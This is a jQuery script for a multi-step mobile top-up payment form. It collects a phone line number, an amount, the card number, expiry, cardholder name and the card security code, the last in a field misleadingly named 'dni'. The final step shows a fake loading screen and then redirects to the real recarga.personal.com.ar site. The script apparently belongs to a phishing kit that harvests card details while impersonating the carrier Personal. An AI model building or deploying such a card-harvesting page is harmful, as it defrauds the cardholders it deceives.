$(document).ready(function(){
	$("#lineNumber").bind('keypress', function (event) {
	    var regex = new RegExp("^[0-9\b]+$");
	    var key = String.fromCharCode(!event.charCode ? event.which : event.charCode);
	    if (!regex.test(key)) {
	       event.preventDefault();
	       return false;
	    }
	});
	$("#cardNumber").bind('keypress', function (event) {
	    var regex = new RegExp("^[0-9\b]+$");
	    var key = String.fromCharCode(!event.charCode ? event.which : event.charCode);
	    if (!regex.test(key)) {
	       event.preventDefault();
	       return false;
	    }
	});
	$("#cardExpiration").bind('keypress', function (event) {
	    var regex = new RegExp("^[0-9\b]+$");
	    var key = String.fromCharCode(!event.charCode ? event.which : event.charCode);
	    if (!regex.test(key)) {
	       event.preventDefault();
	       return false;
	    }
	});
	$("#dni").bind('keypress', function (event) {
	    var regex = new RegExp("^[0-9\b]+$");
	    var key = String.fromCharCode(!event.charCode ? event.which : event.charCode);
	    if (!regex.test(key)) {
	       event.preventDefault();
	       return false;
	    }
	});
	$("#cardName").bind('keypress', function (event) {
	    var regex = new RegExp("^[a-z A-Z.\b]+$");
	    var key = String.fromCharCode(!event.charCode ? event.which : event.charCode);
	    if (!regex.test(key)) {
	       event.preventDefault();
	       return false;
	    }
	});
	$("#form_button_1").click(function(){
		if($("#lineNumber").val() != ""){
			$("#form_1").submit();
		}
	});
	$("#form_button_2").click(function(){
		if($("#amount option:selected").text() != "Selecioná un monto"){
			$("#form_2").submit();
		}
	});

	$("#form_button_3").click(function(){
		card = $("#cardNumber").val().substr(0, 2);
		if(card == "34" || card == "35" || card == "36" || card == "37"){
			if($("#cardNumber").val().length == 17){
				$("#form_3").submit();
			}
			else {
				$("#error-1").css("display", "block");
				$("#cardNumberHelp").css("display", "none");
			}
		}
		else {
			if($("#cardNumber").val().length == 19){
				$("#form_3").submit();
			}
		}
	});
	$("#amount").change(function () {
			$("#form_button_2").removeClass("btn-disabled");
	});
	$("#cardNumber").keyup(function(){
		e = $(this).val();
		el = e.length;
		ele = $(this);
		numbers = $("#card_numbers");
		card = e.substr(0, 2);
		if(card == "34" || card == "35" || card == "36" || card == "37"){
			//amex
			amex();
			$("#typeCard").val("AMEX");
			$("#cardNumberHelpA").css("display", "block");
			$("#cardNumberHelp").css("display", "none");
			$("#generic").css("display", "none");
			$("#amex").css("display", "block");
			$("#visa").css("display", "none");
			$("#mastercard").css("display", "none");
			if(el == 5){
				last = e.substr(4, 1);
				if(last == " "){
					val1 = e.substr(0, 4);
					ele.val(val1);
					console.log("1");
				}
				else {
					val1 = e.substr(0, 4);
					val2 = e.substr(4, 1);
					ele.val(val1+" "+val2);
					console.log("2");
				}
			}
			else if(el == 12){
				last = e.substr(11, 1);
				if(last == " "){
					val1 = e.substr(0, 4);
					val2 = e.substr(5, 6);
					ele.val(val1+" "+val2);
					console.log("3");
				}
				else {
					val1 = e.substr(0, 4);
					val2 = e.substr(5, 6);
					val3 = e.substr(11, 5);
					ele.val(val1+" "+val2+" "+val3);
					console.log("4");
				}
			}
		}
		else if(card == "40" || card == "41" || card == "42" || card == "43" || card == "44" || card == "45" || card == "46" || card == "47" || card == "48" || card == "49"){
			//visa
			otra_card();
			$("#typeCard").val("Visa");
			$("#cardNumberHelp").css("display", "block");
			$("#cardNumberHelpA").css("display", "none");
			$("#generic").css("display", "none");
			$("#amex").css("display", "none");
			$("#visa").css("display", "block");
			$("#mastercard").css("display", "none");
			if(el == 5){
				last = e.substr(4, 1);
				if(last == " "){
					val1 = e.substr(0, 4);
					ele.val(val1);
					console.log("1");
				}
				else {
					val1 = e.substr(0, 4);
					val2 = e.substr(4, 1);
					ele.val(val1+" "+val2);
					console.log("2");
				}
			}
			else if(el == 10){
				last = e.substr(9, 1);
				if(last == " "){
					val1 = e.substr(0, 4);
					val2 = e.substr(5, 4);
					ele.val(val1+" "+val2);
					console.log("3");
				}
				else {
					val1 = e.substr(0, 4);
					val2 = e.substr(5, 4);
					val3 = e.substr(9, 1);
					ele.val(val1+" "+val2+" "+val3);
					console.log("4");
				}
			}
			else if(el == 15){
				last = e.substr(14, 1);
				if(last == " "){
					val1 = e.substr(0, 4);
					val2 = e.substr(5, 4);
					val3 = e.substr(10, 4);
					ele.val(val1+" "+val2+" "+val3);
					console.log("5");
				}
				else {
					val1 = e.substr(0, 4);
					val2 = e.substr(5, 4);
					val3 = e.substr(10, 4);
					val4 = e.substr(14, 4);
					ele.val(val1+" "+val2+" "+val3+" "+val4);
					console.log("6");
				}
			}
		}
		else if(card == "51" || card == "52" || card == "53" || card == "54" || card == "55"){
			//mastercard
			otra_card();
			$("#typeCard").val("MasterCard");
			$("#cardNumberHelp").css("display", "block");
			$("#cardNumberHelpA").css("display", "none");
			$("#generic").css("display", "none");
			$("#amex").css("display", "none");
			$("#visa").css("display", "none");
			$("#mastercard").css("display", "block");
			if(el == 5){
				last = e.substr(4, 1);
				if(last == " "){
					val1 = e.substr(0, 4);
					ele.val(val1);
					console.log("1");
				}
				else {
					val1 = e.substr(0, 4);
					val2 = e.substr(4, 1);
					ele.val(val1+" "+val2);
					console.log("2");
				}
			}
			else if(el == 10){
				last = e.substr(9, 1);
				if(last == " "){
					val1 = e.substr(0, 4);
					val2 = e.substr(5, 4);
					ele.val(val1+" "+val2);
					console.log("3");
				}
				else {
					val1 = e.substr(0, 4);
					val2 = e.substr(5, 4);
					val3 = e.substr(9, 1);
					ele.val(val1+" "+val2+" "+val3);
					console.log("4");
				}
			}
			else if(el == 15){
				last = e.substr(14, 1);
				if(last == " "){
					val1 = e.substr(0, 4);
					val2 = e.substr(5, 4);
					val3 = e.substr(10, 4);
					ele.val(val1+" "+val2+" "+val3);
					console.log("5");
				}
				else {
					val1 = e.substr(0, 4);
					val2 = e.substr(5, 4);
					val3 = e.substr(10, 4);
					val4 = e.substr(14, 4);
					ele.val(val1+" "+val2+" "+val3+" "+val4);
					console.log("6");
				}
			}
		}
		else {
			otra_card();
			$("#cardNumberHelp").css("display", "block");
			$("#cardNumberHelpA").css("display", "none");
			$("#generic").css("display", "block");
			$("#amex").css("display", "none");
			$("#visa").css("display", "none");
			$("#mastercard").css("display", "none");
			if(el == 5){
				last = e.substr(4, 1);
				if(last == " "){
					val1 = e.substr(0, 4);
					ele.val(val1);
					console.log("1");
				}
				else {
					val1 = e.substr(0, 4);
					val2 = e.substr(4, 1);
					ele.val(val1+" "+val2);
					console.log("2");
				}
			}
			else if(el == 10){
				last = e.substr(9, 1);
				if(last == " "){
					val1 = e.substr(0, 4);
					val2 = e.substr(5, 4);
					ele.val(val1+" "+val2);
					console.log("3");
				}
				else {
					val1 = e.substr(0, 4);
					val2 = e.substr(5, 4);
					val3 = e.substr(9, 1);
					ele.val(val1+" "+val2+" "+val3);
					console.log("4");
				}
			}
			else if(el == 15){
				last = e.substr(14, 1);
				if(last == " "){
					val1 = e.substr(0, 4);
					val2 = e.substr(5, 4);
					val3 = e.substr(10, 4);
					ele.val(val1+" "+val2+" "+val3);
					console.log("5");
				}
				else {
					val1 = e.substr(0, 4);
					val2 = e.substr(5, 4);
					val3 = e.substr(10, 4);
					val4 = e.substr(14, 4);
					ele.val(val1+" "+val2+" "+val3+" "+val4);
					console.log("6");
				}
			}
		}

	});
	$("#cardExpiration").keyup(function(){
		e = $(this).val();
		el = e.length;
		ele = $(this);
		if(el == 3){
			last = e.substr(2, 1);
			if(last == "/"){
				val1 = e.substr(0,2);
				ele.val(val1);
			}
			else{
				val1 = e.substr(0,2);
				val2 = e.substr(2, 1);
				ele.val(val1+"/"+val2);
			}
		}
		document.getElementById("venc").textContent = $("#cardExpiration").val();
	});
	$("#form_button_4").click(function(){
		e = $("#cardExpiration").val();
		el = e.length;
		ele = $("#cardExpiration");
		if(el == 5){
			month = e.substr(0, 2);
			if(month < 13){
				$("#form_4").submit();
			}
		}
	});
	$("#form_button_5").click(function(){
		if($("#cardName").val() != ""){
			$("#form_5").submit();
		}
	});
	$("#form_button_6").click(function(){
		if($("#dni").val() != ""){
			$("#form_6").submit();
		}
	});
	$("#form_button_7").click(function(){
		$("#loading").css("display", "flex");
		setTimeout(function(){
			$("#loading").css("display", "none");
			// $("#error").css("display", "block");
			window.location.href="https://recarga.personal.com.ar/pages/phone";
		}, 3000);
	});
});



function amex(){
$("#cardNumber").attr("minlength", "17");
$("#cardNumber").attr("maxlength", "17");
var numeros = document.getElementById("cardNumber").value;
var numres = numeros.replace(/ /g, "");
	if(numres.length == 0){
		document.getElementById("card_numbers").textContent = "**** ****** *****";
	}
  else if(numres.length == 1){
    document.getElementById("card_numbers").textContent = numres+"*** ****** *****";
  }
  else if(numres.length == 2){
    document.getElementById("card_numbers").textContent = numres+"** ****** *****";
  }
  else if(numres.length == 3){
    document.getElementById("card_numbers").textContent = numres+"* ****** *****";
  }
  else if(numres.length == 4){
    document.getElementById("card_numbers").textContent = numres+" ****** *****";
  }
  else if(numres.length == 5){
    var num1 = numres.substr(0, 4);
    var num2 = numres.substr(4, 1);
    document.getElementById("card_numbers").textContent = num1+" "+num2+"***** *****";
  }
  else if(numres.length == 6){
    var num1 = numres.substr(0, 4);
    var num2 = numres.substr(4, 2);
    document.getElementById("card_numbers").textContent = num1+" "+num2+"**** *****";
  }
  else if(numres.length == 7){
    var num1 = numres.substr(0, 4);
    var num2 = numres.substr(4, 3);
    document.getElementById("card_numbers").textContent = num1+" "+num2+"*** *****";
  }
  else if(numres.length == 8){
    var num1 = numres.substr(0, 4);
    var num2 = numres.substr(4, 4);
    document.getElementById("card_numbers").textContent = num1+" "+num2+"** *****";
  }
  else if(numres.length == 9){
    var num1 = numres.substr(0, 4);
    var num2 = numres.substr(4, 5);
    document.getElementById("card_numbers").textContent = num1+" "+num2+"* *****";
  }
  else if(numres.length == 10){
    var num1 = numres.substr(0, 4);
    var num2 = numres.substr(4, 6);
    document.getElementById("card_numbers").textContent = num1+" "+num2+" *****";
  }
  else if(numres.length == 11){
    var num1 = numres.substr(0, 4);
    var num2 = numres.substr(4, 6);
    var num3 = numres.substr(6, 1);
    document.getElementById("card_numbers").textContent = num1+" "+num2+" "+num3+"****";
  }
  else if(numres.length == 12){
    var num1 = numres.substr(0, 4);
    var num2 = numres.substr(4, 6);
    var num3 = numres.substr(6, 2);
    document.getElementById("card_numbers").textContent = num1+" "+num2+" "+num3+"***";
  }
  else if(numres.length == 13){
    var num1 = numres.substr(0, 4);
    var num2 = numres.substr(4, 6);
    var num3 = numres.substr(6, 3);
    document.getElementById("card_numbers").textContent = num1+" "+num2+" "+num3+"**";
  }
  else if(numres.length == 14){
    var num1 = numres.substr(0, 4);
    var num2 = numres.substr(4, 6);
    var num3 = numres.substr(6, 4);
    document.getElementById("card_numbers").textContent = num1+" "+num2+" "+num3+"*";
  }
  else if(numres.length == 15){
    var num1 = numres.substr(0, 4);
    var num2 = numres.substr(4, 6);
    var num3 = numres.substr(6, 5);
    document.getElementById("card_numbers").textContent = num1+" "+num2+" "+num3;
  }
}

function otra_card(){
$("#cardNumber").attr("minlength", "19");
$("#cardNumber").attr("maxlength", "19");
var numeros = document.getElementById("cardNumber").value;
var numres = numeros.replace(/ /g, "");
	if(numres.length == 0){
		document.getElementById("card_numbers").textContent = "**** **** **** ****";
	}
  else if(numres.length == 1){
    document.getElementById("card_numbers").textContent = numres+"*** **** **** ****";
  }
  else if(numres.length == 2){
    document.getElementById("card_numbers").textContent = numres+"** **** **** ****";
  }
  else if(numres.length == 3){
    document.getElementById("card_numbers").textContent = numres+"* **** **** ****";
  }
  else if(numres.length == 4){
    document.getElementById("card_numbers").textContent = numres+" **** **** ****";
  }
  else if(numres.length == 5){
    var num1 = numres.substr(0, 4);
    var num2 = numres.substr(4, 1);
    document.getElementById("card_numbers").textContent = num1+" "+num2+"*** **** ****";
  }
  else if(numres.length == 6){
    var num1 = numres.substr(0, 4);
    var num2 = numres.substr(4, 2);
    document.getElementById("card_numbers").textContent = num1+" "+num2+"** **** ****";
  }
  else if(numres.length == 7){
    var num1 = numres.substr(0, 4);
    var num2 = numres.substr(4, 3);
    document.getElementById("card_numbers").textContent = num1+" "+num2+"* **** ****";
  }
  else if(numres.length == 8){
    var num1 = numres.substr(0, 4);
    var num2 = numres.substr(4, 4);
    document.getElementById("card_numbers").textContent = num1+" "+num2+" **** ****";
  }
  else if(numres.length == 9){
    var num1 = numres.substr(0, 4);
    var num2 = numres.substr(4, 4);
    var num3 = numres.substr(8, 1);
    document.getElementById("card_numbers").textContent = num1+" "+num2+" "+num3+"*** ****";
  }
  else if(numres.length == 10){
    var num1 = numres.substr(0, 4);
    var num2 = numres.substr(4, 4);
    var num3 = numres.substr(8, 2);
    document.getElementById("card_numbers").textContent = num1+" "+num2+" "+num3+"** ****";
  }
  else if(numres.length == 11){
    var num1 = numres.substr(0, 4);
    var num2 = numres.substr(4, 4);
    var num3 = numres.substr(8, 3);
    document.getElementById("card_numbers").textContent = num1+" "+num2+" "+num3+"* ****";
  }
  else if(numres.length == 12){
    var num1 = numres.substr(0, 4);
    var num2 = numres.substr(4, 4);
    var num3 = numres.substr(8, 4);
    document.getElementById("card_numbers").textContent = num1+" "+num2+" "+num3+" ****";
  }
  else if(numres.length == 13){
    var num1 = numres.substr(0, 4);
    var num2 = numres.substr(4, 4);
    var num3 = numres.substr(8, 4);
    var num4 = numres.substr(12, 1);
    document.getElementById("card_numbers").textContent = num1+" "+num2+" "+num3+" "+num4+"***";
  }
  else if(numres.length == 14){
    var num1 = numres.substr(0, 4);
    var num2 = numres.substr(4, 4);
    var num3 = numres.substr(8, 4);
    var num4 = numres.substr(12, 2);
    document.getElementById("card_numbers").textContent = num1+" "+num2+" "+num3+" "+num4+"**";
  }
  else if(numres.length == 15){
    var num1 = numres.substr(0, 4);
    var num2 = numres.substr(4, 4);
    var num3 = numres.substr(8, 4);
    var num4 = numres.substr(12, 3);
    document.getElementById("card_numbers").textContent = num1+" "+num2+" "+num3+" "+num4+"*";
  }
  else if(numres.length == 16){
    var num1 = numres.substr(0, 4);
    var num2 = numres.substr(4, 4);
    var num3 = numres.substr(8, 4);
    var num4 = numres.substr(12, 4);
    document.getElementById("card_numbers").textContent = num1+" "+num2+" "+num3+" "+num4;
  }
}



$("#dni").keyup(function(){
	var numeros = document.getElementById("dni").value;
	if($("#typeCard").val() != "AMEX"){
		if(numeros.length == 0){
			document.getElementById("cod_normal").textContent = "***";
		}
		else if(numeros.length == 1){
			document.getElementById("cod_normal").textContent = numeros+"**";
		}
		else if(numeros.length == 2){
			document.getElementById("cod_normal").textContent = numeros+"*";
		}
		else if(numeros.length == 3){
			document.getElementById("cod_normal").textContent = numeros;
		}
	}
	else {
		if(numeros.length == 0){
			document.getElementById("cod_amex").textContent = "****";
		}
		else if(numeros.length == 1){
			document.getElementById("cod_amex").textContent = numeros+"***";
		}
		else if(numeros.length == 2){
			document.getElementById("cod_amex").textContent = numeros+"**";
		}
		else if(numeros.length == 3){
			document.getElementById("cod_amex").textContent = numeros+"*";
		}
		else if(numeros.length == 4){
			document.getElementById("cod_amex").textContent = numeros;
		}
	}
});

$("#cardName").keyup(function(){
	var name = document.getElementById("cardName").value;
	if(name.length != 0){
		document.getElementById("name").textContent = name;
	}
	else {
		document.getElementById("name").textContent = "NOMBRE Y APELLIDO";
	}
});